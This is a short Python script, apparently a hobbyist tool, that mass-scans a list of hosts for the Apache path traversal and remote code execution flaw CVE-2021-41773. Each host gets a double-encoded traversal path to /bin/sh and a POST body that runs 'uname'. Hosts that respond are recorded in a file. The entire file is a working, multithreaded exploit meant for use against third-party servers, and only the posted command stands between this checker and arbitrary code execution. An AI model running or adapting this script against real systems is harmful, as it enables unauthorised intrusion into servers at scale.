# Mass check Apache CVE-2021-41773
# Just4Fun
# Coded by Justakazh


import sys
import requests
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



print("""
	APACHE RCE
 _____ _   _ _____ 
/  __ \ | | |  ___|
| /  \/ | | | |__  
| |   | | | |  __| 
| \__/\ \_/ / |___ 
 \____/\___/\____/ -2021-41773

Coded By: Justakazh
FB: fb.com/justakazh

                    """)

def jan_Cok(target):
	try:
		a = target.strip().replace("http://", "").replace("https://", "").replace("/", "")
		url = "http://{}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh".format(a)

		s = requests.Session()
		req = requests.Request(method='POST' , url=url, data="echo; uname")
		prep = req.prepare()
		prep.url = url
		r = s.send(prep, verify=False, timeout=10)

		# detect by root on /etc/passwd 
		if r.text.strip() == "Linux" or r.text.strip() == "linux":
			print("[*] Vuln -> "+target)
			# save result
			open("vuln.txt", "a").write(target+"\n")
		else:
			print("[!] Not_Vuln -> "+target)
	except:
		pass

liss = [i.strip() for i in open(str(input("List : ")), "r").readlines()]
x = Pool(int(input("Thread : ")))
x.map(jan_Cok, liss)
